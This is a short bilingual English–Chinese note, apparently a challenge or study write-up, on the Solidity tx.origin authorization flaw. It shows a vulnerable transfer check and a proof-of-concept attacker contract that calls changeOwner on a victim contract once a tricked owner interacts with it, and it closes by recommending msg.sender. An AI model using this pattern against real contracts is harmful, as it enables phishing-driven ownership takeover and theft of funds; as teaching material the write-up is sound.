# Exploit Idea: Using `tx.origin` for permission checking can lead to phishing-style attacks

# 漏洞思路：使用 `tx.origin` 做权限校验可能导致钓鱼式攻击

---

## 🧠 Concept Summary / 概念总结

if a contract uses `tx.origin` for permission checking like this:
如果某个合约像这样使用 `tx.origin` 进行权限校验：

```javascript
    function transfer(address to, uint amount) public {
        require(tx.origin == owner, "Not owner");
        // 转账逻辑...
    }
```

This check can potentially be bypassed by calling the contract through an intermediary contract (“Contract A” calling “Contract B”).
可以通过“合约 A 调用合约 B”的方式绕过 tx.origin == owner 的判断。

---

## 🔬Proof of Concept / 概念证明

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttacker{
    function attack() external {
        address telephoneContractAddr = <victim-contract-address>;
        (bool success ,bytes memory data) = telephoneContractAddr.call(
            abi.encodeWithSignature("changeOwner(address)", <attacter-address>)
        );
    }
}
```

If you can trick the victim into interacting with this attack contract,
you can exploit tx.origin to bypass the permission check.
Because tx.origin will always be the original external user — in this case, the victim.
如果你诱导受害者与攻击合约产生交互，就能利用 tx.origin 绕过权限验证。
因为 tx.origin 永远指向交易最初发起的外部账户，也就是受害者。

---

## 📝Notes

1. Using msg.sender is much safer than using tx.origin.
   相较于 tx.origin，使用 msg.sender 更加安全。
2. Be cautious when designing admin-level or transfer functions.
   Flexibility often introduces more potential attack surfaces.
   在设计管理员操作或转账函数时需要格外小心，越灵活的设计往往意味着越大的攻击面。
